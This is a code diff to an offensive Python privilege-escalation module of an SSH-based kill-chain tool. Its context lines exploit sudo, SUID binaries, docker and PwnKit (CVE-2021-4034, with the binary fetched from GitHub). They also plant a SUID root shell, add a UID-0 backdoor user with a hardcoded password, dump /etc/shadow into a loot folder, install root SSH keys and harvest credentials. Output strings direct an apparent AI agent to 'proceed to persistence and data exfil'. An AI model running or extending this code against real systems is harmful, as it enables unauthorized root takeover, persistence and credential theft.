@@ -3,10 +3,6 @@
 import os
 import re
 import time
-import socket
-import shutil
-import subprocess
-import concurrent.futures
 
 try:
     import paramiko
@@ -14,7 +10,7 @@ except ImportError:
     paramiko = None
 
 try:
-    from config import CFG, find_wordlist, find_all_wordlists
+    from config import CFG, find_all_wordlists, find_wordlist
 except ImportError:
     CFG = {}
     def find_wordlist(cat): return ""
@@ -24,9 +20,9 @@ import logging
 import secrets
 import string
 
+from core.killchain.exploitation import _EXPLOITABLE_SUIDS, _LINPEAS_URL, _PRIVESC_CHECKS, _SUID_SKIP
 from core.killchain.exploits import get_privesc_exploits
 from core.killchain.ssh_helpers import _ssh_connect, _ssh_exec
-from core.killchain.exploitation import _PRIVESC_CHECKS, _EXPLOITABLE_SUIDS, _SUID_SKIP, _LINPEAS_URL
 
 # Use unified colors
 try:
@@ -58,9 +54,7 @@ BACKDOOR_USER = "firefart"  # DirtyCow default username
 BACKDOOR_SALT = "octopus"
 
 
-# ═══════════════════════════════════════════════
 # PARAMIKO SSH HELPERS (shared across stages)
-# ═══════════════════════════════════════════════
 
 
 def _run_linpeas(client, timeout: int = 180) -> tuple:
@@ -208,7 +202,7 @@ def _run_linpeas(client, timeout: int = 180) -> tuple:
 
 
 def _harvest_credentials(client, host: str) -> str:
-    """Post-exploitation credential harvesting (v8.0).
+    """Post-exploitation credential harvesting.
     Called after successful privilege escalation."""
     output = f"\n{'=' * 50}\n[CREDENTIAL HARVEST -- {host}]\n{'=' * 50}\n"
     print(f"\n    {C_GREEN}[*] Harvesting credentials...{C_RESET}")
@@ -261,7 +255,7 @@ def _harvest_credentials(client, host: str) -> str:
         "find /root /home -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' 2>/dev/null",
         timeout=10)
     if ssh_keys.strip():
-        output += f"\n[SSH PRIVATE KEYS]\n"
+        output += "\n[SSH PRIVATE KEYS]\n"
         for key_path in ssh_keys.strip().splitlines()[:5]:
             key_path = key_path.strip()
             if key_path:
@@ -307,7 +301,7 @@ def _harvest_credentials(client, host: str) -> str:
         "2>/dev/null | head -5",
         timeout=10)
     if browser_files.strip():
-        output += f"\n[BROWSER CREDENTIAL FILES]\n"
+        output += "\n[BROWSER CREDENTIAL FILES]\n"
         for bf in browser_files.strip().splitlines():
             output += f"  {bf.strip()}\n"
         output += "  AI: Extract with [CMD: python3 -c 'from lazagne.all import *; computer_password(print)'] or manual DPAPI.\n"
@@ -456,7 +450,7 @@ def run_privesc(host: str, user: str, password: str, port: int = 22) -> str:
 
                 else:
                     print(f" {C_GREEN}✓{C_RESET}")
-                    # v4.2: Show actual data for important checks (not just ✓)
+                    # Include evidence for important checks, not only status.
                     _SHOW_DATA_LABELS = {
                         "Backup files", "Config files with passwords",
                         "SSH private keys", "Interesting configs",
@@ -482,7 +476,7 @@ def run_privesc(host: str, user: str, password: str, port: int = 22) -> str:
             for vec in privesc_vectors:
                 output += f"  [{vec['type']}] {vec['binary']} → {vec['exploit']}\n"
 
-            # v6.0: Try ALL vectors (not just the first), and capture PROOF
+            # Try every vector and retain proof from successful checks.
             for vec in privesc_vectors:
                 if got_root:
                     break
@@ -496,13 +490,13 @@ def run_privesc(host: str, user: str, password: str, port: int = 22) -> str:
                 if vtype == "SUDO_NOPASSWD":
                     # Try sudo -i, show actual output
                     id_result = _ssh_exec(client, "sudo -n id 2>&1", timeout=10)
-                    output += f"\n[PRIVESC ATTEMPT: SUDO_NOPASSWD]\n"
+                    output += "\n[PRIVESC ATTEMPT: SUDO_NOPASSWD]\n"
                     output += f"  [PROOF] sudo -n id → {id_result.strip()}\n"
                     print(f"    {C_CYAN}[PROOF] sudo -n id → {id_result.strip()[:80]}{C_RESET}")
 
                     if "uid=0" in id_result:
                         got_root = True
-                        output += f"  [+] PRIVESC SUCCESSFUL via sudo! uid=0 CONFIRMED.\n"
+                        output += "  [+] PRIVESC SUCCESSFUL via sudo! uid=0 CONFIRMED.\n"
                         print(f"    {C_GREEN}[+] ROOT CONFIRMED via sudo!{C_RESET}")
                         # Dump proof artifacts
                         shadow = _ssh_exec(client, "sudo cat /etc/shadow 2>/dev/null", timeout=10)
@@ -517,7 +511,7 @@ def run_privesc(host: str, user: str, password: str, port: int = 22) -> str:
                 elif vtype == "SUID":
                     output += f"\n[PRIVESC ATTEMPT: SUID — {vbin}]\n"
 
-                    # v6.0: Use correct exploit syntax per binary
+                    # Each exploit adapter has distinct command syntax.
                     if vbin == "bash":
                         # bash -p preserves euid from SUID
                         id_result = _ssh_exec(client, "bash -p -c 'id' 2>&1", timeout=10)
@@ -525,7 +519,7 @@ def run_privesc(host: str, user: str, password: str, port: int = 22) -> str:
                         print(f"    {C_CYAN}[PROOF] bash -p → {id_result.strip()[:80]}{C_RESET}")
                         if "uid=0" in id_result or "euid=0" in id_result:
                             got_root = True
-                            output += f"  [+] SUID BASH PRIVESC SUCCESSFUL!\n"
+                            output += "  [+] SUID BASH PRIVESC SUCCESSFUL!\n"
                             shadow = _ssh_exec(client, "bash -p -c 'cat /etc/shadow' 2>/dev/null", timeout=10)
                             if shadow and "$" in shadow:
                                 output += f"\n[PROOF: /etc/shadow via bash -p]\n{shadow[:2000]}\n"
@@ -570,14 +564,14 @@ void gconv_init() {
                             if "uid=0" in check or "euid=0" in check:
                                 pwnkit_ok = True
                                 got_root = True
-                                output += f"  [+] PWNKIT CVE-2021-4034 PRIVESC SUCCESSFUL!\n"
+                                output += "  [+] PWNKIT CVE-2021-4034 PRIVESC SUCCESSFUL!\n"
                                 print(f"    {C_GREEN}[+] ROOT via PwnKit (gcc)!{C_RESET}")
                                 shadow = _ssh_exec(client, "/tmp/.mtr/rootbash -p -c 'cat /etc/shadow' 2>/dev/null", timeout=10)
                                 if shadow and "$" in shadow:
                                     output += f"\n[PROOF: /etc/shadow via PwnKit]\n{shadow[:2000]}\n"
 
                         if not pwnkit_ok:
-                            # v8.0: Download pre-compiled PwnKit binary (no gcc needed!)
+                            # Use a precompiled PwnKit binary when no compiler is present.
                             print(f"    {C_CYAN}[*] Downloading pre-compiled PwnKit binary...{C_RESET}")
                             _PWNKIT_URLS = [
                                 "https://github.com/ly4k/PwnKit/raw/main/PwnKit",
@@ -618,7 +612,7 @@ void gconv_init() {
                             if pk_downloaded:
                                 _ssh_exec(client, f"chmod +x {pk_path}", timeout=5)
 
-                                # v8.1: PwnKit binary creates SUID rootbash first
+                                # The PwnKit adapter creates the SUID root shell first.
                                 # Step 1: Create SUID bash via PwnKit
                                 _ssh_exec(client,
                                     f"{pk_path} 'cp /bin/bash /tmp/.mtr/rootbash && chmod 4755 /tmp/.mtr/rootbash' 2>/dev/null",
@@ -639,14 +633,11 @@ void gconv_init() {
                                 if "uid=0" in pk_result or "euid=0" in pk_result or "root" in pk_result or has_rootbash:
                                     got_root = True
                                     pwnkit_ok = True
-                                    output += f"  [+] PWNKIT BINARY PRIVESC SUCCESSFUL!\n"
+                                    output += "  [+] PWNKIT BINARY PRIVESC SUCCESSFUL!\n"
                                     print(f"    {C_GREEN}[+] ROOT via pre-compiled PwnKit!{C_RESET}")
 
                                     # Determine the root shell command
-                                    if has_rootbash:
-                                        root_cmd = "/tmp/.mtr/rootbash -p -c"
-                                    else:
-                                        root_cmd = f"{pk_path}"
+                                    root_cmd = "/tmp/.mtr/rootbash -p -c" if has_rootbash else f"{pk_path}"
 
                                     # Step 3: Extract /etc/shadow
                                     shadow = _ssh_exec(client,
@@ -656,7 +647,7 @@ void gconv_init() {
                                         print(f"    {C_GREEN}[+] Extracted /etc/shadow ({len(shadow)} bytes){C_RESET}")
                                         output += f"\n[PROOF: /etc/shadow via PwnKit]\n{shadow[:2000]}\n"
 
-                                        # v8.1: Save shadow to loot
+                                        # Retain the shadow-file evidence with other loot.
                                         loot_dir = os.path.expanduser(f"~/OCTOPUS/loot/{host.replace('.','_')}")
                                         os.makedirs(loot_dir, exist_ok=True)
                                         shadow_path = os.path.join(loot_dir, "shadow")
@@ -714,7 +705,7 @@ void gconv_init() {
                                             capture_output=True, timeout=15
                                         )
                                     if os.path.isfile(local_key_path):
-                                        with open(local_key_path, "r") as kf:
+                                        with open(local_key_path) as kf:
                                             pub_key = kf.read().strip()
                                         _ssh_exec(client,
                                             f"{root_cmd} 'mkdir -p /root/.ssh && chmod 700 /root/.ssh && "
@@ -752,10 +743,10 @@ void gconv_init() {
                                     output += "\n  [+] \u2713 ROOT ACCESS CONFIRMED\n"
 
                                 else:
-                                    output += f"  [-] Pre-compiled PwnKit did not yield root.\n"
+                                    output += "  [-] Pre-compiled PwnKit did not yield root.\n"
                                     print(f"    {C_YELLOW}[-] PwnKit binary did not give root{C_RESET}")
                             else:
-                                output += f"  [!] Could not download pre-compiled PwnKit (no internet?).\n"
+                                output += "  [!] Could not download pre-compiled PwnKit (no internet?).\n"
                                 print(f"    {C_YELLOW}[!] PwnKit binary download failed{C_RESET}")
 
                             # Cleanup PwnKit (keep rootbash if created)
@@ -767,7 +758,7 @@ void gconv_init() {
                         print(f"    {C_CYAN}[PROOF] find -exec → {id_result.strip()[:80]}{C_RESET}")
                         if "uid=0" in id_result or "euid=0" in id_result:
                             got_root = True
-                            output += f"  [+] SUID FIND PRIVESC SUCCESSFUL!\n"
+                            output += "  [+] SUID FIND PRIVESC SUCCESSFUL!\n"
 
                     elif vbin == "python" or vbin == "python3":
                         id_result = _ssh_exec(client, f"{vbin} -c 'import os; os.setuid(0); os.system(\"id\")' 2>&1", timeout=10)
@@ -787,8 +778,8 @@ void gconv_init() {
                             got_root = True
 
                     elif vbin == "mount":
-                        output += f"  [!] mount SUID — not directly exploitable for root shell.\n"
-                        output += f"  [!] Useful only with specific mount-based attacks (e.g. NFS).\n"
+                        output += "  [!] mount SUID — not directly exploitable for root shell.\n"
+                        output += "  [!] Useful only with specific mount-based attacks (e.g. NFS).\n"
 
                     else:
                         # Generic attempt
@@ -798,26 +789,26 @@ void gconv_init() {
                             got_root = True
 
                 elif vtype == "DOCKER":
-                    output += f"\n[PRIVESC ATTEMPT: DOCKER]\n"
+                    output += "\n[PRIVESC ATTEMPT: DOCKER]\n"
                     id_result = _ssh_exec(client, "docker run -v /:/mnt --rm alpine cat /mnt/etc/shadow 2>&1 | head -10", timeout=30)
                     output += f"  [PROOF] docker shadow dump → {id_result.strip()[:500]}\n"
                     if "$" in id_result and "root:" in id_result:
                         got_root = True
-                        output += f"  [+] DOCKER PRIVESC SUCCESSFUL!\n"
+                        output += "  [+] DOCKER PRIVESC SUCCESSFUL!\n"
                         output += f"\n[PROOF: /etc/shadow via docker]\n{id_result[:2000]}\n"
 
                 elif vtype == "WRITABLE_PASSWD":
-                    output += f"\n[PRIVESC ATTEMPT: WRITABLE PASSWD]\n"
+                    output += "\n[PRIVESC ATTEMPT: WRITABLE PASSWD]\n"
                     backdoor_hash = "$1$octopus$f5P0MG/LjCXF.GUyFKPyB."  # password: m3tatr0n
                     _ssh_exec(client, f"echo 'mtr0n:{backdoor_hash}:0:0::/root:/bin/bash' >> /etc/passwd", timeout=10)
                     check = _ssh_exec(client, "grep mtr0n /etc/passwd 2>&1", timeout=5)
                     output += f"  [PROOF] grep mtr0n /etc/passwd → {check.strip()}\n"
                     if "mtr0n" in check:
                         got_root = True
-                        output += f"  [+] WRITABLE PASSWD PRIVESC — added user 'mtr0n' (pass: m3tatr0n) UID 0\n"
+                        output += "  [+] WRITABLE PASSWD PRIVESC — added user 'mtr0n' (pass: m3tatr0n) UID 0\n"
 
                 elif vtype == "WRITABLE_SHADOW":
-                    output += f"\n[PRIVESC ATTEMPT: WRITABLE SHADOW]\n"
+                    output += "\n[PRIVESC ATTEMPT: WRITABLE SHADOW]\n"
                     print(f"    {C_RED}[*] Exploiting writable /etc/shadow...{C_RESET}")
                     # Generate a known hash for password 'm3tatr0n'
                     gen_hash = _ssh_exec(client, "openssl passwd -1 -salt octopus 'm3tatr0n' 2>/dev/null", timeout=5).strip()
@@ -837,7 +828,7 @@ void gconv_init() {
                     output += f"  [PROOF] su root → {check.strip()[:200]}\n"
                     if "uid=0" in check:
                         got_root = True
-                        output += f"  [+] WRITABLE SHADOW PRIVESC SUCCESSFUL! root password → m3tatr0n\n"
+                        output += "  [+] WRITABLE SHADOW PRIVESC SUCCESSFUL! root password → m3tatr0n\n"
                         print(f"    {C_GREEN}[+] ROOT via writable /etc/shadow! Password: m3tatr0n{C_RESET}")
                         # Register new root credential
                         try:
@@ -858,7 +849,7 @@ void gconv_init() {
                                 test_client.close()
                                 if "uid=0" in id_out:
                                     got_root = True
-                                    output += f"  [+] WRITABLE SHADOW PRIVESC SUCCESSFUL via SSH! root:m3tatr0n\n"
+                                    output += "  [+] WRITABLE SHADOW PRIVESC SUCCESSFUL via SSH! root:m3tatr0n\n"
                                     print(f"    {C_GREEN}[+] ROOT via SSH with new shadow password!{C_RESET}")
                                     try:
                                         from tools import register_credential
@@ -868,18 +859,18 @@ void gconv_init() {
                         except Exception as _exc:
                             logging.debug(f"Suppressed in privesc.py: {_exc}")
                     if not got_root:
-                        output += f"  [-] Shadow modification did not yield root access.\n"
+                        output += "  [-] Shadow modification did not yield root access.\n"
 
                 elif vtype == "LXD":
-                    output += f"\n[PRIVESC ATTEMPT: LXD]\n"
-                    output += f"  AI: Use LXD container escape: lxc init alpine priv -c security.privileged=true\n"
+                    output += "\n[PRIVESC ATTEMPT: LXD]\n"
+                    output += "  AI: Use LXD container escape: lxc init alpine priv -c security.privileged=true\n"
 
             # ── FINAL PRIVESC STATUS ─────────────────────────────
             if got_root:
-                output += f"\n[+] ✓ PRIVILEGE ESCALATION CONFIRMED — ROOT ACCESS OBTAINED\n"
+                output += "\n[+] ✓ PRIVILEGE ESCALATION CONFIRMED — ROOT ACCESS OBTAINED\n"
                 print(f"\n  {C_GREEN}[+] ✓ ROOT ACCESS CONFIRMED{C_RESET}")
             else:
-                output += f"\n[-] Privesc vectors tested but none yielded root.\n"
+                output += "\n[-] Privesc vectors tested but none yielded root.\n"
                 print(f"\n  {C_YELLOW}[-] No privesc succeeded{C_RESET}")
 
         else:
@@ -893,11 +884,12 @@ void gconv_init() {
             output += "\nAI: ROOT ACCESS OBTAINED. Proceed to persistence and data exfil.\n"
             return output
 
-        # ── v6.0: TEST DISCOVERED USERS ──────────────────────────
+        # Test discovered users.
         # Try SSH login for key users with known passwords
         # Uses direct SSH connect (never hangs — has 3s timeout per attempt)
-        import paramiko as _paramiko
         import time as _time
+
+        import paramiko as _paramiko
 
         print(f"\n    {C_CYAN}[*] Testing user credentials (root + discovered users)...{C_RESET}")
         output += f"\n{'═' * 60}\n"
@@ -906,7 +898,7 @@ void gconv_init() {
         # Get login users from /etc/passwd
         try:
             passwd_out = _ssh_exec(client, "cat /etc/passwd 2>/dev/null", timeout=8)
-        except Exception as e:
+        except Exception:
             passwd_out = ""
         login_users = []
         for line in passwd_out.splitlines():
@@ -980,7 +972,7 @@ void gconv_init() {
 
                 except _paramiko.AuthenticationException:
                     pass  # wrong password
-                except Exception as e:
+                except Exception:
                     break  # connection error, skip this user entirely
 
                 _time.sleep(0.1)
@@ -992,17 +984,17 @@ void gconv_init() {
             for sl in successful_logins:
                 output += f"    ✓ {sl['user']}:{sl['password']} → {sl['id']}\n"
         else:
-            output += f"  No additional logins found.\n"
+            output += "  No additional logins found.\n"
 
         # ── FINAL STATUS ─────────────────────────────────────────
         if got_root:
-            output += f"\nAI: ROOT ACCESS OBTAINED. Proceed to persistence and data exfil.\n"
+            output += "\nAI: ROOT ACCESS OBTAINED. Proceed to persistence and data exfil.\n"
         else:
-            output += f"\nAI: No root obtained. Try kernel exploits:\n"
+            output += "\nAI: No root obtained. Try kernel exploits:\n"
             kernel = _ssh_exec(client, "uname -r 2>/dev/null", timeout=5)
             output += f"  Kernel: {kernel.strip()}\n"
             output += f"  [SEARCH: {kernel.strip()} privilege escalation exploit]\n"
-            output += f"  [SEARCH: CVE-2021-4034 pkexec PwnKit exploit]\n"
+            output += "  [SEARCH: CVE-2021-4034 pkexec PwnKit exploit]\n"
 
             # ── PHASE 3: Auto kernel exploits ────────────────────
             kernel_exploit_adapters = get_privesc_exploits()
@@ -1026,7 +1018,7 @@ void gconv_init() {
                     if success:
                         got_root = True
 
-        # v8.0: Credential Harvesting after root
+        # Harvest credentials only after root access is established.
         if got_root:
             try:
                 harvest_out = _harvest_credentials(client, host)
@@ -1038,8 +1030,3 @@ void gconv_init() {
         client.close()
 
     return output
-
-
-# ═══════════════════════════════════════════════
-# STAGE 4: ACTIVE PERSISTENCE
-# ═══════════════════════════════════════════════
